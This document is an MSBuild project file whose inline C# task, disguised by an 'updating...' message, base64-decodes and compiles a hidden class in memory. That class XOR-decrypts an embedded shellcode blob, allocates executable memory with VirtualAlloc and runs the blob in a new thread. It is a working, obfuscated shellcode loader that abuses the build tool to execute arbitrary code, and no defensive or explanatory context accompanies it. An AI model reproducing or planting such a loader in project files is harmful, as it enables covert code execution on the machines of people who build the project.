<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">

  <Target Name="really">
   <watchme />
  </Target>
  <UsingTask
    TaskName="watchme"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
  <Task>
      <Code Type="Class" Language="cs">
        <![CDATA[
        using System;
        using System.Collections.Generic;
        using System.Linq;
        using System.Text;
        using System.Runtime.InteropServices;
        using System.Collections.ObjectModel;
        using Microsoft.Build.Framework;
        using Microsoft.Build.Utilities;
        using Microsoft.CSharp;
        using System.CodeDom.Compiler;
        using System.Reflection;

        public class watchme : Task, ITask
        {
            public override bool Execute()
            {
                Console.WriteLine("updating...");
                string cmd = "dXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXM7CnVzaW5nIFN5c3RlbS5UZXh0OwpwdWJsaWMgY2xhc3MgUGxhaW5KYW5lCnsKICAgIHByaXZhdGUgc3RhdGljIFVJbnQzMiBNRU1fQ09NTUlUID0gMHgxMDAwOwogICAgcHJpdmF0ZSBzdGF0aWMgVUludDMyIFBBR0VfUkVBRFdSSVRFID0gMHgwNDsKICAgIHByaXZhdGUgc3RhdGljIFVJbnQzMiBQQUdFX0VYRUNVVEVfUkVBRCA9IDB4MjA7CiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMiIpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIFVJbnQzMiBWaXJ0dWFsQWxsb2MoVUludDMyIGxwU3RhcnRBZGRyLCBVSW50MzIgc2l6ZSwgVUludDMyIGZsQWxsb2NhdGlvblR5cGUsIFVJbnQzMiBmbFByb3RlY3QpOwogICAgW0RsbEltcG9ydCgia2VybmVsMzIiKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBib29sIFZpcnR1YWxQcm90ZWN0KEludFB0ciBhZGRyZXNzLCBVSW50MzIgc2l6ZSwgVUludDMyIG5ld1Byb3RlY3QsIG91dCBVSW50MzIgb2xkUHJvdGVjdCk7CiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMiIpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIEludFB0ciBDcmVhdGVUaHJlYWQoCiAgICAgICAgVUludDMyIGxwVGhyZWFkQXR0cmlidXRlcywKICAgICAgICBVSW50MzIgZHdTdGFja1NpemUsCiAgICAgICAgVUludDMyIGxwU3RhcnRBZGRyZXNzLAogICAgICAgIEludFB0ciBwYXJhbSwKICAgICAgICBVSW50MzIgZHdDcmVhdGlvbkZsYWdzLAogICAgICAgIHJlZiBVSW50MzIgbHBUaHJlYWRJZAogICAgKTsKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyIildCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gVUludDMyIFdhaXRGb3JTaW5nbGVPYmplY3QoSW50UHRyIGhIYW5kbGUsIFVJbnQzMiBkd01pbGxpc2Vjb25kcyk7CiAgICBwdWJsaWMgdm9pZCBFeGVjdXRlKCkgewogICAgICAgIHN0cmluZyByYXcgPSBAIlFBUW5JZ0lOSkFJUlBRMC9LMVVXV3o5Ykl6RUdlZ2NzS24wc0ZpRkhLandpQVRCN0hBQXFhUjBQTmdrbERTd3dBVGtyQXlKbkhIaGlIQ2dWT1g4Nk1nWUZFUWdZUFJjZUkyNCtXZ1VyS2hRNkVqbzdDZzB0RnlGRUNBcFNUQ1I2UHhBeENpNHZGeGxzZWg4Qk1nTlRFUjVNUGxjeUREc0NDUzBwVmlVZk4zSjlNZ29mTVhVRmNtWllBd29yRGpzdEZBNFNBWGhBRUJZUFFSeGhQejh6TFNVTk9nTWFHZ2tpSFJKTU5ENEhiVkUvRWk0MEJSMS9EaUVoTTNNSk13dGdCMkZoUUFBdENnc0xNaGNwYkhVd08zcEZMUWN6Qnhwa1lDNVdCeTRLREM4aGZ4VXpLak1iT3lwTUFVVWJLU01wT1hraUZCa0xYSEFyRFNFY01IVVZBaG9BSjNFbURSd1lJaHMzTHlvYU1pVW9UMkJIR1JNZ1B3c2hJUmtPSDFFMEF5Y2hJQWRoSUZ3Zkx3WXFObms2RndJTEFuVWVHZzQ5U1E4Q1pBTllEUUk2ZWdBT0VRTXNBZ2s3Q1NVbmR4VnhHbGtHS3c1Nklpb1NmQzg3S1VVaFlUeGhaVnNhUEE0b05od0FFaEloQVNJZEdTWmdBM0FTYUJneU1ESUtJbjhLSUFnbkloc2ZOU2N4Y3dKL0REd0ZkandoRHhzWEdUTVBIU05TS3pKeVBBVWJQUTREUEFNVU5oRWdEVHNlSGpVOEttRWthZ1FFSkM4N0lRZ3ZFU2NyTmlvek5pb3djQ1JXR0FFT1BpRU9maUFXQ3cwYklTNU1GRWtQQTNvdUJpd3BMZzhDQmlzS0t4Y2RSUWNITUZzK1FnQTVWbkZBY2hrMklpc1ZKU2s5SWlrbmR4ZDZZaTBOQXpvTUlRY1ZJUTF5R2dSVkZFa1BBbVFEV3l3U09TWXBGUUVrRFhSblRUUVZFWDRCWlRjakJSSXVDZ3dPRVJ3a2Nud2tUQVV5QlF4K1lDOEpCeTRLREJBU0N3SUNEVFVpRWdkM0ZYRUhLeUFTRGcwbkNoWm5QV3g1TGkwSE13STZYZ0JZQlFjbUNnOGdGbjAvTEEwRUFobFNRSHRtUGdrZ2RoVi9QU2tDTHlvRlB6dzdQekY3R2xaZ0xSUnBRR1IyR1EwMkxEWUhJQVFtS0Z3M1JSaytOd2NhWkExUUxDQS9NZ2t5TTN4WFoya04iOwogICAgICAgIGJ5dGVbXSBzaGVsbGNvZGUgPSBDb252ZXJ0LkZyb21CYXNlNjRTdHJpbmcocGpsYWRkZCgib0tOYUNMZUNIdGNTZjZUMFZqYkYiLCBCYXNlNjREZWNvZGUocmF3KSkpOwogICAgICAgIFVJbnQzMiBmdW5jQWRkciA9IFZpcnR1YWxBbGxvYygwLCAoVUludDMyKXNoZWxsY29kZS5MZW5ndGgsIE1FTV9DT01NSVQsIFBBR0VfUkVBRFdSSVRFKTsKICAgICAgICBNYXJzaGFsLkNvcHkoc2hlbGxjb2RlLCAwLCAoSW50UHRyKShmdW5jQWRkciksIHNoZWxsY29kZS5MZW5ndGgpOwogICAgICAgIFVJbnQzMiBvbGRQcm90ZWN0OwogICAgICAgIFZpcnR1YWxQcm90ZWN0KChJbnRQdHIpKGZ1bmNBZGRyKSwgKFVJbnQzMilzaGVsbGNvZGUuTGVuZ3RoLCBQQUdFX0VYRUNVVEVfUkVBRCwgb3V0IG9sZFByb3RlY3QpOwogICAgICAgIEludFB0ciBoVGhyZWFkID0gSW50UHRyLlplcm87CiAgICAgICAgVUludDMyIHRocmVhZElkID0gMDsKICAgICAgICBJbnRQdHIgcGluZm8gPSBJbnRQdHIuWmVybzsKICAgICAgICBoVGhyZWFkID0gQ3JlYXRlVGhyZWFkKDAsIDAsIGZ1bmNBZGRyLCBwaW5mbywgMCwgcmVmIHRocmVhZElkKTsKICAgICAgICBXYWl0Rm9yU2luZ2xlT2JqZWN0KGhUaHJlYWQsIDB4RkZGRkZGRkYpOwogICAgfQoKICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIHBqbGFkZGQoc3RyaW5nIGtleSwgc3RyaW5nIGlucHV0KQogICAgewogICAgICAgIFN0cmluZ0J1aWxkZXIgc2IgPSBuZXcgU3RyaW5nQnVpbGRlcigpOwogICAgICAgIGZvcihpbnQgaT0wOyBpIDwgaW5wdXQuTGVuZ3RoOyBpKyspCiAgICAgICAgICAgIHNiLkFwcGVuZCgoY2hhcikoaW5wdXRbaV0gXiBrZXlbKGkgJSBrZXkuTGVuZ3RoKV0pKTsKICAgICAgICBTdHJpbmcgcmVzdWx0ID0gc2IuVG9TdHJpbmcoKTsKICAgICAgICByZXR1cm4gcmVzdWx0OwogICAgfQoKICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIEJhc2U2NEVuY29kZShzdHJpbmcgdGV4dCkgewogICAgICAgcmV0dXJuIFN5c3RlbS5Db252ZXJ0LlRvQmFzZTY0U3RyaW5nKFN5c3RlbS5UZXh0LkVuY29kaW5nLlVURjguR2V0Qnl0ZXModGV4dCkpOwogICAgfQoKICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIEJhc2U2NERlY29kZShzdHJpbmcgZW5jb2RlZHRleHQpIHsKCSAgICByZXR1cm4gU3lzdGVtLlRleHQuRW5jb2RpbmcuVVRGOC5HZXRTdHJpbmcoU3lzdGVtLkNvbnZlcnQuRnJvbUJhc2U2NFN0cmluZyhlbmNvZGVkdGV4dCkpOwogICAgfQp9";
                CSharpCodeProvider watchme = new CSharpCodeProvider();
                CompilerParameters parameters = new CompilerParameters();
                parameters.ReferencedAssemblies.Add("System.dll");
                parameters.ReferencedAssemblies.Add("System.Runtime.InteropServices.dll");
                parameters.GenerateExecutable = false;
                parameters.GenerateInMemory = true;
                parameters.IncludeDebugInformation = false;
                CompilerResults results = watchme.CompileAssemblyFromSource(parameters, Base64Decode(cmd));
                Assembly assembly = results.CompiledAssembly;
                object obj = assembly.CreateInstance("PlaineJane");
                obj.GetType().InvokeMember("Execute", BindingFlags.InvokeMethod, null, obj, null);
                return true;
            }

            public static string Base64Encode(string text) {
               return System.Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(text));
            }

            public static string Base64Decode(string encodedtext) {
                return System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(encodedtext));
            }
        }
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
